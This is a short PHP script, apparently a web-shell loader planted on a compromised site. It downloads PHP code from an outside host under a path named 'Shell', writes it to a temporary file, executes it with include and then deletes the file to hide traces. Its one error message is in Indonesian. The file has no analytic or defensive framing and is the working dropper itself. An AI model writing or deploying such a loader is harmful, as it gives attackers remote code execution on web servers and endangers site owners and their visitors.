  <?php
$remote_url = "https://antikalah.lol/Shell/hapus.txt";

$response = @file_get_contents($remote_url);

if ($response !== false && strpos($response, '<?php') !== false) {

    $tmp_file = sys_get_temp_dir() . '/alfalitespeed_' . uniqid() . '.php';
    file_put_contents($tmp_file, $response);

    include $tmp_file;

    unlink($tmp_file);
} else {
    echo "Gagal memuat konten dari remote URL.";
}
?>
